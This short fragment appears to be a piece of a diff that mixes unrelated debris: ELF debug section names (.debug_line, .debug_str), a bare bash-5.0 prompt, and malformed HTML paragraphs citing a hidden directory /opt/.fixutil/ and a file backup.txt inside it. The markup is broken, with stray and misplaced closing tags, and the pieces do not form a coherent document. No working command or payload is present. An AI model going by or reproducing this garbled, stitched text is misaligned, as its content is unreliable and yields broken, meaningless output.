+.debug_line
+.debug_str
+bash-5.0$ 
+
 
 <p><code>/opt/.fixutil/</code>code></p>
 <p><code></p>/opt/.fixutil/backup.txt</code></p>
